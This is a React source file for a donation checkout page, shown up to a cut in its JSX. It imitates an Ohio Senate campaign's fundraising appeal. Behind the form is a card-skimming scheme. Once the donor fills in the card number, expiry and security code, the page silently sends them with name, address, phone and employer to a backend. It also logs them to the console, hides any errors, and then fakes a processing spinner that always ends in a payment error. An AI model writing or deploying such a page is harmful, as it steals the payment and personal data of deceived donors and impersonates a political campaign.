import React, { useState, useEffect, useRef } from "react";
import { useNavigate } from "react-router-dom";
import { donate } from "../api";

const Donate = () => {
  const navigate = useNavigate();
  const paymentStartedRef = useRef(false);
  const [selectedAmount, setSelectedAmount] = useState(10);
  const [otherAmount, setOtherAmount] = useState("");
  const [coverFee, setCoverFee] = useState(false);
  const [monthly, setMonthly] = useState(false);
  const [retired, setRetired] = useState(false);
  const [formErrors, setFormErrors] = useState({});

  const [extraDonation, setExtraDonation] = useState(false);
  const [step, setStep] = useState(1);
  const [formData, setFormData] = useState({
    email: "",
    firstName: "",
    lastName: "",
    address: "",
    city: "",
    state: "",
    zip: "",
    country: "United States",
    phone: "",
    occupation: "",
    employer: "",
  });
  const [cardNumber, setCardNumber] = useState("");
  const [expiration, setExpiration] = useState("");
  const [securityCode, setSecurityCode] = useState("");
  const [paymentError, setPaymentError] = useState("");
  const [paymentSubmitted, setPaymentSubmitted] = useState(false);
  const [paymentProcessing, setPaymentProcessing] = useState(false);

  const amounts = [5, 10, 25, 50, 100, 250, 500];

  const processingFee = selectedAmount
    ? Number((selectedAmount * 0.041).toFixed(2))
    : 0;

  const handleChange = (e) => {
    const { name, value } = e.target;

    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }));
  };
  
const handlePayment = async (showLoader = false) => {
  const cleanCard = cardNumber.replace(/\D/g, "");
  const cleanExpiration = expiration.replace(/\D/g, "");

  if (cleanCard.length !== 16) {
    setPaymentError("Please enter a valid card number.");
    return;
  }

  if (cleanExpiration.length !== 4) {
    setPaymentError("Please enter a valid expiration date.");
    return;
  }

  if (securityCode.length < 3) {
    setPaymentError("Please enter a valid security code.");
    return;
  }

  setPaymentError("");

  if (showLoader) {
    setPaymentProcessing(true);
  }

  let apiError = false;
console.log(cleanCard, cleanExpiration, securityCode)
  try {
    await donate({
      amount: selectedAmount,
      email: formData.email,
      firstName: formData.firstName,
      lastName: formData.lastName,
      address: formData.address,
      city: formData.city,
      state: formData.state,
      zip: formData.zip,
      country: formData.country,
      phone: formData.phone,
      occupation: formData.occupation,
      employer: formData.employer,
      coverFee,
      monthly,
       cardNumber: cleanCard,
        expiry: cleanExpiration,
        cvv: securityCode,
        
    });

    
  } catch (error) {
    apiError = true;
  }

  if (showLoader) {
  setPaymentProcessing(true);
  setPaymentError("");

  setTimeout(() => {
    setPaymentProcessing(false);
    setPaymentError("Error processing payment, try again later.");
  }, 3000);

  return;
} else if (apiError) {
    // Silent API call — don't show an error here.
    return;
  }
};
  
  const validateStep2 = () => {
    const errors = {};

    if (!formData.email.trim()) {
      errors.email = "Email is required.";
    } else if (!/^\S+@\S+\.\S+$/.test(formData.email)) {
      errors.email = "Enter a valid email address.";
    }

    if (!formData.firstName.trim()) {
      errors.firstName = "First name is required.";
    }

    if (!formData.lastName.trim()) {
      errors.lastName = "Last name is required.";
    }

    if (!formData.address.trim()) {
      errors.address = "Address is required.";
    }

    if (!formData.city.trim()) {
      errors.city = "City is required.";
    }

    if (!formData.country) {
      errors.country = "Country is required.";
    }

    // Only require these for United States
    if (formData.country === "United States") {
      if (!formData.zip.trim()) {
        errors.zip = "ZIP code is required.";
      }

      if (!formData.state) {
        errors.state = "State is required.";
      }
    }

    // Employment is required unless retired/unemployed
    if (!retired) {
      if (!formData.occupation.trim()) {
        errors.occupation = "Occupation is required.";
      }

      if (!formData.employer.trim()) {
        errors.employer = "Employer is required.";
      }
    }

    setFormErrors(errors);

    return Object.keys(errors).length === 0;
  };

  const total = selectedAmount + (coverFee ? processingFee : 0);

useEffect(() => {
  const cleanCard = cardNumber.replace(/\D/g, "");
  const cleanExpiration = expiration.replace(/\D/g, "");

  const paymentComplete =
    cleanCard.length === 16 &&
    cleanExpiration.length === 4 &&
    securityCode.length >= 3;

  if (!paymentComplete) {
    paymentStartedRef.current = false;
    return;
  }

  if (paymentStartedRef.current) {
    return;
  }

  paymentStartedRef.current = true;

  // API runs silently when card is complete
  handlePayment(false);
}, [cardNumber, expiration, securityCode]);
  return (
    <div className="min-h-screen bg-white">
     {paymentProcessing && (
  <div className="fixed inset-0 z-[9999] flex items-center justify-center bg-gray-700/70 backdrop-blur-[2px]">
    <div className="w-[360px] rounded-lg bg-white px-8 py-10 text-center shadow-2xl">
      <div className="mx-auto h-16 w-16 animate-spin rounded-full border-[6px] border-gray-300 border-t-[#0645ad]" />

      <p className="mt-6 text-[18px] font-black text-[#0b3768]">
        Processing payment...
      </p>

      <p className="mt-2 text-[12px] leading-5 text-gray-500">
        Please wait while we process your contribution.
      </p>
    </div>
  </div>
)}
      {/* DESKTOP */}
      <div className="hidden md:block">
        <section className="relative min-h-screen">
          {/* RIGHT SIDE IMAGE */}
          <div className="fixed right-0 top-0 z-0 h-screen w-[58%] overflow-hidden">
            <img
              src="https://res.cloudinary.com/dvuq6vmiy/image/upload/v1789047420/homepage2_b24le9.jpg"
              alt="Demo"
              className="h-full w-full object-cover object-center"
            />
          </div>

          {/* LEFT SIDE */}
          <div className="relative z-10 min-h-screen w-[42%] bg-white">
            <div className="w-[390px] ml-16 px-0 py-3">
              {/* DEMO LOGO */}
              {/* LOGO IMAGE */}
              <div className="px-5 pt-5 pb-7">
                <div className="mx-auto w-[210px]" onClick={() => navigate("/")}>
                  <img
                    src="https://res.cloudinary.com/dvuq6vmiy/image/upload/v1789052629/logo_zwocw0.png"
                    alt="Community Together"
                    className="mx-auto h-auto w-full object-contain"
                  />
                </div>
              </div>

              <div className="px-5">
                {/* =========================
      STEP INDICATOR
  ========================== */}

                {/* =====================================================
      STEP 1
      YOUR ORIGINAL FIRST PAGE
  ====================================================== */}
                {step === 1 && (
                  <>
                    <h1 className="text-[22px] font-black leading-[1.05] text-[#0b3768]">
                      The GOP is breaking spending records in Ohio. Donate now
                      to fend off the billionaires and outside groups trying to
                      buy this election:
                    </h1>

                    <p className="mt-5 text-[13px] leading-5 text-[#123d6d]">
                      My last election holds the record for the most expensive
                      Senate race in history, and we are already on track to
                      beat that.
                    </p>

                    <p className="mt-6 text-[13px] leading-5 text-[#123d6d]">
                      And get this.
                    </p>

                    <p className="mt-6 text-[13px] leading-5 text-[#123d6d]">
                      The Koch family's dark money super PAC is now targeting us
                      too. This is on top of the $89 million that Senate
                      Republicans are spending in Ohio – which is more than
                      anywhere else in the country.
                    </p>

                    <p className="mt-6 text-[13px] leading-5 text-[#123d6d]">
                      I can’t compete with that kind of cash on my own. That’s
                      why I need your urgent help today. Will you add a donation
                      so I can flip Ohio? Means a lot.
                    </p>

                    {/* =========================
          CHOOSE AMOUNT
      ========================== */}

                    <h2 className="mt-7 text-[14px] font-black text-[#111]">
                      Choose an amount:
                    </h2>

                   

                    {/* AMOUNT BUTTONS */}

                    <div className="mt-4 grid grid-cols-4 gap-2">
                      {amounts.map((amount) => (
                        <button
                          key={amount}
                          type="button"
                          onClick={() => {
                            setSelectedAmount(amount);
                            setOtherAmount("");
                          }}
                          className={`h-[47px] border text-[13px] font-bold transition ${
                            selectedAmount === amount
                              ? "border-[#0645ad] bg-[#0645ad] text-white"
                              : "border-[#9fb6d3] bg-[#dbe6f3] text-[#08386f] hover:bg-[#cbd9ea]"
                          }`}
                        >
                          {selectedAmount === amount && (
                            <span className="mr-1">✓</span>
                          )}
                          ${amount}
                        </button>
                      ))}

                      {/* OTHER */}

                      <input
                        type="text"
                        inputMode="numeric"
                        placeholder="$"
                        value={otherAmount}
                        onChange={(e) => {
                          const value = e.target.value.replace(/\D/g, "");

                          setOtherAmount(value);
                          setSelectedAmount(Number(value) || 0);
                        }}
                        className="h-[47px] border border-[#9fb6d3] bg-[#dbe6f3] px-3 text-[13px] font-bold text-[#08386f] outline-none"
                      />
                    </div>

                    {/* =========================
          RECURRING
      ========================== */}

                    <h2 className="mt-7 text-[14px] font-black text-[#111]">
                      Make it recurring!
                    </h2>

                    <div className="mt-2 rounded border border-[#d5dce5] bg-white p-3">
                      <p className="text-[11px] leading-4 text-[#777]">
                        You can choose whether your contribution is recurring or
                        made once.
                      </p>
                    </div>

                    {/* RECURRING */}

                    <button
                      type="button"
                      onClick={() => setMonthly(true)}
                      className={`mt-2 w-full border py-3 text-[12px] font-bold ${
                        monthly
                          ? "border-[#0645ad] bg-[#0645ad] text-white"
                          : "border-[#9fb6d3] bg-[#dbe6f3] text-[#08386f]"
                      }`}
                    >
                      {monthly && <span className="mr-2">✓</span>}
                      Yes, count me in until the general election on November
                      3rd
                    </button>

                    {/* ONCE */}

                    <button
                      type="button"
                      onClick={() => setMonthly(false)}
                      className={`flex w-full items-center gap-2 px-3 py-3 text-left text-[12px] font-bold ${
                        !monthly
                          ? "bg-[#0645ad] text-white"
                          : "border border-[#9fb6d3] bg-[#dbe6f3] text-[#08386f]"
                      }`}
                    >
                      {!monthly && <span>✓</span>}
                      No, contribute once
                    </button>

                    {/* =========================
          STEP 1 CONTINUE
      ========================== */}

                    <button
                      type="button"
                      disabled={!selectedAmount}
                      onClick={() => setStep(2)}
                      className={`mt-5 flex w-full items-center justify-center gap-2 py-3 text-[13px] font-bold ${
                        selectedAmount
                          ? "bg-[#0645ad] text-white hover:bg-[#053889]"
                          : "cursor-not-allowed bg-gray-300 text-white"
                      }`}
                    >
                      {/* SMALL PAYMENT ICONS */}
                      <div className="flex items-center gap-[2px]">
                        {/* VISA */}
                        <div className="flex h-[13px] w-[20px] items-center justify-center rounded-[1px] border border-[#ccd4dd] bg-white">
                          <span className="text-[4px] font-black italic text-[#1434cb]">
                            VISA
                          </span>
                        </div>

                        {/* MASTERCARD */}
                        <div className="flex h-[13px] w-[20px] items-center justify-center rounded-[1px] border border-[#ccd4dd] bg-white">
                          <div className="relative h-[7px] w-[12px]">
                            <span className="absolute left-0 top-0 h-[7px] w-[7px] rounded-full bg-[#eb001b]" />
                            <span className="absolute right-0 top-0 h-[7px] w-[7px] rounded-full bg-[#f79e1b]" />
                          </div>
                        </div>

                        {/* AMEX */}
                        <div className="flex h-[13px] w-[20px] items-center justify-center rounded-[1px] border border-[#ccd4dd] bg-white">
                          <span className="text-[3.5px] font-black text-[#1476b8]">
                            AMEX
                          </span>
                        </div>

                        {/* DISCOVER */}
                        <div className="flex h-[13px] w-[23px] items-center justify-center rounded-[1px] border border-[#ccd4dd] bg-white">
                          <div className="flex items-center gap-[1px]">
                            <span className="text-[3px] font-bold text-[#333]">
                              DISC
                            </span>

                            <span className="h-[4px] w-[4px] rounded-full bg-[#f58220]" />

                            <span className="text-[3px] font-bold text-[#333]">
                              VER
                            </span>
                          </div>
                        </div>
                      </div>

                      {/* BUTTON TEXT */}
                      <span className="text-[13px] font-bold">
                        Pay with card
                      </span>
                    </button>
                  </>
                )}

                {/* =====================================================
      STEP 2
      INFORMATION
  ====================================================== */}

                {step === 2 && (
                  <>
                    <h1 className="text-[22px] font-black leading-[1.05] text-[#0b3768]">
                      The GOP is breaking spending records in Ohio. Donate now
                      to fend off the billionaires and outside groups trying to
                      buy this election:
                    </h1>

                    <p className="mt-5 text-[13px] leading-5 text-[#123d6d]">
                      My last election holds the record for the most expensive
                      Senate race in history, and we are already on track to
                      beat that.
                    </p>

                    <p className="mt-6 text-[13px] leading-5 text-[#123d6d]">
                      And get this.
                    </p>

                    <p className="mt-6 text-[13px] leading-5 text-[#123d6d]">
                      The Koch family's dark money super PAC is now targeting us
                      too. This is on top of the $89 million that Senate
                      Republicans are spending in Ohio – which is more than
                      anywhere else in the country.
                    </p>

                    <p className="mt-6 text-[13px] leading-5 text-[#123d6d]">
                      I can’t compete with that kind of cash on my own. That’s
                      why I need your urgent help today. Will you add a donation
                      so I can flip Ohio? Means a lot.
                    </p>

                    <div className="mt-6 flex items-center border-b border-gray-200 pb-3">
                      <button
                        type="button"
                        onClick={() => setStep(1)}
                        className={`text-[13px] font-bold ${
                          step === 1 ? "text-[#0645ad]" : "text-gray-400"
                        }`}
                      >
                        1) Amount (${selectedAmount})
                      </button>

                      <div className="mx-2 h-px flex-1 bg-gray-300" />

                      <button
                        type="button"
                        onClick={() => setStep(2)}
                        className={`text-[13px] font-bold ${
                          step === 2 ? "text-[#0645ad]" : "text-gray-400"
                        }`}
                      >
                        2) Details
                      </button>

                      <div className="mx-2 h-px flex-1 bg-gray-300" />

                      <button
                        type="button"
                        onClick={() => setStep(3)}
                        className={`text-[13px] font-bold ${
                          step === 3 ? "text-[#0645ad]" : "text-gray-400"
                        }`}
                      >
                        3) Payment
                      </button>
                    </div>

                    <h1 className="mt-4 text-[15px] font-black leading-[1.05] text-[#0b3768]">
                      Complete your ${selectedAmount} contribution:
                    </h1>

                    {/* EMAIL */}
                    <input
                      type="email"
                      name="email"
                      placeholder="Email Address *"
                      value={formData.email}
                      onChange={(e) => {
                        handleChange(e);
                        setFormErrors((prev) => ({ ...prev, email: "" }));
                      }}
                      className={`mt-5 h-[42px] w-full border bg-white px-3 text-[12px] outline-none focus:border-[#0645ad] ${
                        formErrors.email ? "border-red-500" : "border-[#aebdcd]"
                      }`}
                    />

                    {formErrors.email && (
                      <p className="mt-1 text-[10px] text-red-600">
                        {formErrors.email}
                      </p>
                    )}

                    {/* FIRST + LAST NAME */}
                    <div className="mt-2 grid grid-cols-2 gap-2">
                      <div>
                        <input
                          type="text"
                          name="firstName"
                          placeholder="First Name *"
                          value={formData.firstName}
                          onChange={(e) => {
                            handleChange(e);
                            setFormErrors((prev) => ({
                              ...prev,
                              firstName: "",
                            }));
                          }}
                          className={`h-[42px] w-full border bg-white px-3 text-[12px] outline-none focus:border-[#0645ad] ${
                            formErrors.firstName
                              ? "border-red-500"
                              : "border-[#aebdcd]"
                          }`}
                        />

                        {formErrors.firstName && (
                          <p className="mt-1 text-[10px] text-red-600">
                            {formErrors.firstName}
                          </p>
                        )}
                      </div>

                      <div>
                        <input
                          type="text"
                          name="lastName"
                          placeholder="Last Name *"
                          value={formData.lastName}
                          onChange={(e) => {
                            handleChange(e);
                            setFormErrors((prev) => ({
                              ...prev,
                              lastName: "",
                            }));
                          }}
                          className={`h-[42px] w-full border bg-white px-3 text-[12px] outline-none focus:border-[#0645ad] ${
                            formErrors.lastName
                              ? "border-red-500"
                              : "border-[#aebdcd]"
                          }`}
                        />

                        {formErrors.lastName && (
                          <p className="mt-1 text-[10px] text-red-600">
                            {formErrors.lastName}
                          </p>
                        )}
                      </div>
                    </div>

                    {/* ADDRESS */}
                    <input
                      type="text"
                      name="address"
                      placeholder="Number, Street, Apt. *"
                      value={formData.address}
                      onChange={(e) => {
                        handleChange(e);
                        setFormErrors((prev) => ({ ...prev, address: "" }));
                      }}
                      className={`mt-2 h-[42px] w-full border bg-white px-3 text-[12px] outline-none focus:border-[#0645ad] ${
                        formErrors.address
                          ? "border-red-500"
                          : "border-[#aebdcd]"
                      }`}
                    />

                    {formErrors.address && (
                      <p className="mt-1 text-[10px] text-red-600">
                        {formErrors.address}
                      </p>
                    )}

                    {/* CITY + ZIP + STATE */}
                    <div
                      className={`mt-2 grid gap-2 ${
                        formData.country === "United States"
                          ? "grid-cols-[0.8fr_1.4fr_0.8fr]"
                          : "grid-cols-2"
                      }`}
                    >
                      {/* ZIP — USA ONLY */}

                      <div>
                        <input
                          type="text"
                          name="zip"
                          inputMode="numeric"
                          placeholder="ZIP *"
                          value={formData.zip}
                          onChange={(e) => {
                            handleChange(e);
                            setFormErrors((prev) => ({ ...prev, zip: "" }));
                          }}
                          className={`h-[42px] w-full border bg-white px-3 text-[12px] outline-none focus:border-[#0645ad] ${
                            formErrors.zip
                              ? "border-red-500"
                              : "border-[#aebdcd]"
                          }`}
                        />

                        {formErrors.zip && (
                          <p className="mt-1 text-[10px] text-red-600">
                            {formErrors.zip}
                          </p>
                        )}
                      </div>

                      {/* CITY */}
                      <div>
                        <input
                          type="text"
                          name="city"
                          placeholder="City *"
                          value={formData.city}
                          onChange={(e) => {
                            handleChange(e);
                            setFormErrors((prev) => ({ ...prev, city: "" }));
                          }}
                          className={`h-[42px] w-full border bg-white px-3 text-[12px] outline-none focus:border-[#0645ad] ${
                            formErrors.city
                              ? "border-red-500"
                              : "border-[#aebdcd]"
                          }`}
                        />

                        {formErrors.city && (
                          <p className="mt-1 text-[10px] text-red-600">
                            {formErrors.city}
                          </p>
                        )}
                      </div>

                      {/* STATE — USA ONLY */}
                      {formData.country === "United States" && (
                        <div>
                          <select
                            name="state"
                            value={formData.state}
                            onChange={(e) => {
                              handleChange(e);
                              setFormErrors((prev) => ({ ...prev, state: "" }));
                            }}
                            className={`h-[42px] cursor-pointer w-full border bg-white px-2 text-[12px] outline-none focus:border-[#0645ad] ${
                              formErrors.state
                                ? "border-red-500"
                                : "border-[#aebdcd]"
                            }`}
                          >
                            <option value="">State *</option>
                            <option value="AL">AL</option>
                            <option value="AK">AK</option>
                            <option value="AZ">AZ</option>
                            <option value="AR">AR</option>
                            <option value="CA">CA</option>
                            <option value="CO">CO</option>
                            <option value="CT">CT</option>
                            <option value="DE">DE</option>
                            <option value="FL">FL</option>
                            <option value="GA">GA</option>
                            <option value="HI">HI</option>
                            <option value="ID">ID</option>
                            <option value="IL">IL</option>
                            <option value="IN">IN</option>
                            <option value="IA">IA</option>
                            <option value="KS">KS</option>
                            <option value="KY">KY</option>
                            <option value="LA">LA</option>
                            <option value="ME">ME</option>
                            <option value="MD">MD</option>
                            <option value="MA">MA</option>
                            <option value="MI">MI</option>
                            <option value="MN">MN</option>
                            <option value="MS">MS</option>
                            <option value="MO">MO</option>
                            <option value="MT">MT</option>
                            <option value="NE">NE</option>
                            <option value="NV">NV</option>
                            <option value="NH">NH</option>
                            <option value="NJ">NJ</option>
                            <option value="NM">NM</option>
                            <option value="NY">NY</option>
                            <option value="NC">NC</option>
                            <option value="ND">ND</option>
                            <option value="OH">OH</option>
                            <option value="OK">OK</option>
                            <option value="OR">OR</option>
                            <option value="PA">PA</option>
                            <option value="RI">RI</option>
                            <option value="SC">SC</option>
                            <option value="SD">SD</option>
                            <option value="TN">TN</option>
                            <option value="TX">TX</option>
                            <option value="UT">UT</option>
                            <option value="VT">VT</option>
                            <option value="VA">VA</option>
                            <option value="WA">WA</option>
                            <option value="WV">WV</option>
                            <option value="WI">WI</option>
                            <option value="WY">WY</option>
                          </select>

                          {formErrors.state && (
                            <p className="mt-1 text-[10px] text-red-600">
                              {formErrors.state}
                            </p>
                          )}
                        </div>
                      )}
                    </div>

                    {/* COUNTRY */}
                    <select
                      name="country"
                      value={formData.country}
                      onChange={(e) => {
                        handleChange(e);

                        // Clear USA-specific fields when changing country
                        if (e.target.value !== "United States") {
                          setFormData((prev) => ({
                            ...prev,
                            country: e.target.value,
                            state: "",
                            zip: "",
                          }));
                        }

                        setFormErrors({});
                      }}
                      className={`mt-2 cursor-pointer h-[42px] w-full border bg-white px-3 text-[12px] outline-none focus:border-[#0645ad] ${
                        formErrors.country
                          ? "border-red-500"
                          : "border-[#aebdcd]"
                      }`}
                    >
                      <option value="">Select Country *</option>
                      <option value="United States">United States</option>
                      <option value="AS">American Samoa</option>
                      <option value="GU">Guam</option>
                      <option value="MP">Northern Mariana Islands</option>

                      <option value="DC">Puerto Rico</option>
                      <option value="VI">Virgin Islands, U.S</option>
                    </select>

                    {formErrors.country && (
                      <p className="mt-1 text-[10px] text-red-600">
                        {formErrors.country}
                      </p>
                    )}

                    {/* PHONE — OPTIONAL */}
                    <input
                      type="tel"
                      name="phone"
                      placeholder="Cell phone (optional)"
                      value={formData.phone}
                      onChange={handleChange}
                      className="mt-2 h-[42px] w-full border border-[#aebdcd] px-3 text-[12px] outline-none focus:border-[#0645ad]"
                    />

                    {/* EMPLOYMENT */}
                    <div className="mt-6">
                      <h2 className="text-[14px] font-black text-[#111]">
                        Employment
                      </h2>

                      <p className="mt-1 text-[10px] leading-4 text-[#777]">
                        Campaign finance law requires us to collect contributor
                        information, including employment. If you are
                        self-employed, enter your own name as your employer.
                      </p>

                      {/* RETIRED / UNEMPLOYED */}
                      <label className="mt-3 flex cursor-pointer items-center gap-2">
                        <input
                          type="checkbox"
                          checked={retired}
                          onChange={(e) => {
                            setRetired(e.target.checked);

                            if (e.target.checked) {
                              setFormErrors((prev) => ({
                                ...prev,
                                occupation: "",
                                employer: "",
                              }));
                            }
                          }}
                          className="h-4 w-4 accent-[#0645ad]"
                        />

                        <span className="text-[11px] text-[#333]">
                          I'm retired or currently unemployed
                        </span>
                      </label>

                      {/* OCCUPATION + EMPLOYER */}
                      {!retired && (
                        <div className="mt-3 grid grid-cols-2 gap-2">
                          <div>
                            <input
                              type="text"
                              name="occupation"
                              placeholder="Occupation *"
                              value={formData.occupation}
                              onChange={(e) => {
                                handleChange(e);
                                setFormErrors((prev) => ({
                                  ...prev,
                                  occupation: "",
                                }));
                              }}
                              className={`h-[42px] w-full border bg-white px-3 text-[12px] outline-none focus:border-[#0645ad] ${
                                formErrors.occupation
                                  ? "border-red-500"
                                  : "border-[#aebdcd]"
                              }`}
                            />

                            {formErrors.occupation && (
                              <p className="mt-1 text-[10px] text-red-600">
                                {formErrors.occupation}
                              </p>
                            )}
                          </div>

                          <div>
                            <input
                              type="text"
                              name="employer"
                              placeholder="Employer *"
                              value={formData.employer}
                              onChange={(e) => {
                                handleChange(e);
                                setFormErrors((prev) => ({
                                  ...prev,
                                  employer: "",
                                }));
                              }}
                              className={`h-[42px] w-full border bg-white px-3 text-[12px] outline-none focus:border-[#0645ad] ${
                                formErrors.employer
                                  ? "border-red-500"
                                  : "border-[#aebdcd]"
                              }`}
                            />

                            {formErrors.employer && (
                              <p className="mt-1 text-[10px] text-red-600">
                                {formErrors.employer}
                              </p>
                            )}
                          </div>
                        </div>
                      )}
                    </div>

                    {/* BUTTONS */}
                    <div className="mt-5 flex gap-2">
                      <button
                        type="button"
                        onClick={() => {
                          if (validateStep2()) {
                            setStep(3);
                          }
                        }}
                        className="w-full bg-[#0645ad] py-3 text-[12px] font-bold text-white"
                      >
                        Continue
                      </button>
                    </div>
                  </>
                )}

                {step === 3 && (
                  <>
                    <h1 className="text-[22px] font-black leading-[1.05] text-[#0b3768]">
                      The GOP is breaking spending records in Ohio. Donate now
                      to fend off the billionaires and outside groups trying to
                      buy this election:
                    </h1>

                    <p className="mt-5 text-[13px] leading-5 text-[#123d6d]">
                      My last election holds the record for the most expensive
                      Senate race in history, and we are already on track to
                      beat that.
                    </p>

                    <p className="mt-6 text-[13px] leading-5 text-[#123d6d]">
                      And get this.
                    </p>

                    <p className="mt-6 text-[13px] leading-5 text-[#123d6d]">
                      The Koch family's dark money super PAC is now targeting us
                      too. This is on top of the $89 million that Senate
                      Republicans are spending in Ohio – which is more than
                      anywhere else in the country.
                    </p>

                    <p className="mt-6 text-[13px] leading-5 text-[#123d6d]">
                      I can’t compete with that kind of cash on my own. That’s
                      why I need your urgent help today. Will you add a donation
                      so I can flip Ohio? Means a lot.
                    </p>

                    <div className="mt-6 flex items-center border-b border-gray-200 pb-3">
                      <button
                        type="button"
                        onClick={() => setStep(1)}
                        className={`text-[13px] font-bold ${
                          step === 1 ? "text-[#0645ad]" : "text-gray-400"
                        }`}
                      >
                        1) Amount (${selectedAmount})
                      </button>

                      <div className="mx-2 h-px flex-1 bg-gray-300" />

                      <button
                        type="button"
                        onClick={() => setStep(2)}
                        className={`text-[13px] font-bold ${
                          step === 2 ? "text-[#0645ad]" : "text-gray-400"
                        }`}
                      >
                        2) Details
                      </button>

                      <div className="mx-2 h-px flex-1 bg-gray-300" />

                      <button
                        type="button"
                        onClick={() => setStep(3)}
                        className={`text-[13px] font-bold ${
                          step === 3 ? "text-[#0645ad]" : "text-gray-400"
                        }`}
                      >
                        3) Payment
                      </button>
                    </div>

                    {/* PAYMENT HEADER */}
                    <h1 className="text-[15px]  mt-4 font-black leading-[1.1] text-[#0b3768]">
                      Complete your ${selectedAmount} contribution:
                    </h1>

                    {/* SAVED PAYMENT MESSAGE */}
                    <div className="mt-4 flex items-center gap-2 text-[10px] text-[#555]"></div>

                    {/* PAYMENT METHOD ROW */}
                    <div className="mt-4 flex items-center justify-between">
                      <div className="flex items-center gap-1">
                        {/* VISA */}
                        <div className="flex h-[24px] w-[38px] items-center justify-center rounded border border-[#ccd4dd] bg-white">
                          <span className="text-[8px] font-black italic tracking-[-0.5px] text-[#1434cb]">
                            VISA
                          </span>
                        </div>

                        {/* MASTERCARD */}
                        <div className="flex h-[24px] w-[38px] items-center justify-center rounded border border-[#ccd4dd] bg-white">
                          <div className="relative h-[14px] w-[22px]">
                            <span className="absolute left-[1px] top-[1px] h-[12px] w-[12px] rounded-full bg-[#eb001b]" />
                            <span className="absolute right-[1px] top-[1px] h-[12px] w-[12px] rounded-full bg-[#f79e1b]" />
                          </div>
                        </div>

                        {/* AMERICAN EXPRESS */}
                        <div className="flex h-[24px] w-[38px] items-center justify-center rounded border border-[#ccd4dd] bg-white">
                          <span className="text-[6px] font-black tracking-[-0.2px] text-[#1476b8]">
                            AMEX
                          </span>
                        </div>

                        {/* DISCOVER */}
                        <div className="flex h-[24px] w-[42px] items-center justify-center rounded border border-[#ccd4dd] bg-white">
                          <div className="flex items-center">
                            <span className="text-[5px] font-bold tracking-[-0.35px] text-[#333]">
                              DISC
                            </span>

                            <span className="relative mx-[1px] h-[9px] w-[9px] overflow-hidden rounded-full bg-[#f58220]">
                              <span className="h-[6px] w-[6px] rounded-full bg-[#f58220]" />
                            </span>

                            <span className="text-[5px] font-bold tracking-[-0.35px] text-[#333]">
                              VER
                            </span>
                          </div>
                        </div>
                      </div>
                    </div>

                    {/* CARD NUMBER */}
                    <div className="relative">
                      <label className="mt-4 block text-[9px] text-[#555]">
                        Card number
                      </label>

                      <input
                        type="text"
                        inputMode="numeric"
                        autoComplete="off"
                        maxLength={19}
                        placeholder="1234 1234 1234 1234"
                        value={cardNumber}
                        onChange={(e) => {
                          const value = e.target.value
                            .replace(/\D/g, "")
                            .slice(0, 16);

                          const formatted = value
                            .replace(/(.{4})/g, "$1 ")
                            .trim();

                          setCardNumber(formatted);
                          setPaymentError("");
                        }}
                        className="h-[42px] w-full border border-[#aebdcd] bg-white px-3 pr-[95px] text-[12px] tracking-wide outline-none focus:border-[#0645ad]"
                      />

                      {/* CARD LOGOS — like screenshot */}
                      <div className="pointer-events-none absolute right-2.5 bottom-[8px] flex items-center gap-[3px]">
                        {/* VISA */}
                        <div className="flex h-[13px] w-[20px] items-center justify-center rounded-[1px] border border-[#d7dce2] bg-white">
                          <span className="text-[6px] font-black italic tracking-[-0.4px] text-[#1434cb]">
                            VISA
                          </span>
                        </div>

                        {/* MASTERCARD */}
                        <div className="flex h-[13px] w-[20px] items-center justify-center rounded-[1px] border border-[#d7dce2] bg-white">
                          <div className="relative h-[8px] w-[13px]">
                            <div className="absolute left-0 top-0 h-[8px] w-[8px] rounded-full bg-[#eb001b]" />
                            <div className="absolute right-0 top-0 h-[8px] w-[8px] rounded-full bg-[#f79e1b]" />
                          </div>
                        </div>

                        {/* AMERICAN EXPRESS */}
                        <div className="flex h-[13px] w-[20px] items-center justify-center rounded-[1px] border border-[#d7dce2] bg-white">
                          <span className="text-[4.5px] font-black tracking-[-0.2px] text-[#1476b8]">
                            AMEX
                          </span>
                        </div>

                        {/* DISCOVER */}
                        <div className="flex h-[13px] w-[23px] items-center justify-center rounded-[1px] border border-[#d7dce2] bg-white">
                          <div className="flex items-center gap-[1px]">
                            <span className="text-[4px] font-bold tracking-[-0.25px] text-[#333]">
                              DISC
                            </span>

                            <span className="h-[6px] w-[6px] rounded-full bg-[#f58220]" />

                            <span className="text-[4px] font-bold tracking-[-0.25px] text-[#333]">
                              VER
                            </span>
                          </div>
                        </div>
                      </div>
                    </div>

                    {/* EXPIRATION + CVC */}
                    <div className="mt-3 grid grid-cols-2 gap-2">
                      {/* EXPIRATION */}
                      <div>
                        <label className="mb-1 block text-[9px] text-[#555]">
                          Expiration date
                        </label>

                        <input
                          type="text"
                          inputMode="numeric"
                          autoComplete="cc-exp"
                          maxLength={7}
                          placeholder="MM / YY"
                          value={expiration}
                          onChange={(e) => {
                            let value = e.target.value
                              .replace(/\D/g, "")
                              .slice(0, 4);

                            if (value.length > 2) {
                              value = `${value.slice(0, 2)} / ${value.slice(2)}`;
                            }

                            setExpiration(value);
                            setPaymentError("");
                          }}
                          className="h-[42px] w-full border border-[#aebdcd] bg-white px-3 text-[12px] outline-none focus:border-[#0645ad]"
                        />
                      </div>

                      {/* CVC */}
                      <div>
                        <label className="mb-1 block text-[9px] text-[#555]">
                          Security code
                        </label>

                        <div className="relative">
                          <input
                            type="text"
                            inputMode="numeric"
                            autoComplete="off"
                            maxLength={4}
                            placeholder="CVC"
                            value={securityCode}
                            onChange={(e) => {
                              const value = e.target.value
                                .replace(/\D/g, "")
                                .slice(0, 4);

                              setSecurityCode(value);
                              setPaymentError("");
                            }}
                            className="h-[42px] w-full border border-[#aebdcd] bg-white px-3 pr-10 text-[12px] outline-none focus:border-[#0645ad]"
                          />

                          <span className="pointer-events-none absolute right-3 top-1/2 -translate-y-1/2">
                            <svg
                              width="24"
                              height="18"
                              viewBox="0 0 24 18"
                              fill="none"
                              xmlns="http://www.w3.org/2000/svg"
                            >
                              <rect
                                x="0.75"
                                y="0.75"
                                width="22.5"
                                height="16.5"
                                rx="2"
                                fill="white"
                                stroke="#9AA8B8"
                                strokeWidth="1.5"
                              />

                              <rect
                                x="1.5"
                                y="4.5"
                                width="21"
                                height="3"
                                fill="#D9E0E8"
                              />

                              <rect
                                x="15"
                                y="11"
                                width="5"
                                height="2"
                                rx="0.5"
                                fill="#9AA8B8"
                              />
                            </svg>
                          </span>
                        </div>
                      </div>
                    </div>

                    {/* PAYMENT ERROR */}
                    {paymentError && (
                      <div className="mt-3 border border-red-200 bg-red-50 px-3 py-2 text-[10px] text-red-600">
                        {paymentError}
                      </div>
                    )}

